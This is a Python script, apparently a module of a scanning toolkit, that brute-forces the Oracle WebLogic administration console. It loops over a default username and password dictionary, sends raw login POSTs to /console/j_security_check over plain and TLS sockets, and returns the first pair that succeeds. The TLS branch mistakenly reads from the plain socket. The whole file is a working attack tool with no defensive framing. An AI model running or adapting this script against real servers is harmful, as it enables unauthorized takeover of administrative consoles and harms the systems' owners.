#coding:utf-8
#!/usr/bin/env Python
#(Weblogic_Console_brute)

import socket
import ssl,re
import Payload.default_data.dict_user_pass

socket.setdefaulttimeout(1)

def payload():
    pocs = []
    for username in Payload.default_data.dict_user_pass.username:
        for password in Payload.default_data.dict_user_pass.password:
            poc="j_username={}&j_password={}&j_character_encoding=UTF-8".format(username,password)
            pocs.append(poc)
    return pocs
'''
def payload():
    pocs = []
    for username in default_data.dict_user_pass.username:
        for password in default_data.dict_user_pass.password:
            poc="j_username={}&j_password={}&j_character_encoding=UTF-8".format(username,password)
            pocs.append(poc)
    return pocs
'''
def brute(ip,port):
    for i in range(len(payload())):
        content_length = len(payload()[i])
        try:
            client1 = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            client1.connect((ip,int(port)))
            client1.sendall(str.encode('''POST /console/j_security_check HTTP/1.1\r\nHost: {}:{}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length:{}\r\n\r\n{}'''.format(ip,port,content_length,''.join(payload()[i]))))

            buf1 = "" 
            buf = "1"
            while len(buf):
                try:
                    buf1 = buf1 + str(buf)
                    buf = client1.recv(1024)
                except socket.error as e:
                    break
            client1.close()
            if '''href="http://{}:{}/console">'''.format(ip,port) in buf1:
                username = ''.join(re.findall(r'j_username=(.*?)&j_pass',payload()[i],re.I))
                password = ''.join(re.findall(r'j_password=(.*?)&j_char',payload()[i],re.I))
                return username,password
            else:
                pass
        except socket.error as e:
            pass

        
        try:
            client2 = ssl.wrap_socket(socket.socket())
            client2.connect((ip,int(port)))
            client2.sendall(str.encode('''POST /console/j_security_check HTTP/1.1\r\nHost: {}:{}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length:{}\r\n\r\n{}'''.format(ip,port,content_length,''.join(payload()[i]))))
            buf1 = ""                                                  
            buf = "1"
            while len(buf):
                try:
                    buf1 = buf1 + str(buf)
                    buf = client1.recv(1024)
                except socket.error as e:
                    break
            client2.close()  
            if '''href="http://{}:{}/console">'''.format(ip,port) in buf1:
                username = ''.join(re.findall(r'j_username=(.*?)&j_pass',payload()[i],re.I))
                password = ''.join(re.findall(r'j_password=(.*?)&j_char',payload()[i],re.I))
                return username,password
            else:
                pass
        except socket.error as e:
            pass

if __name__=="__main__":
    print(brute('192.168.231.130',7001))
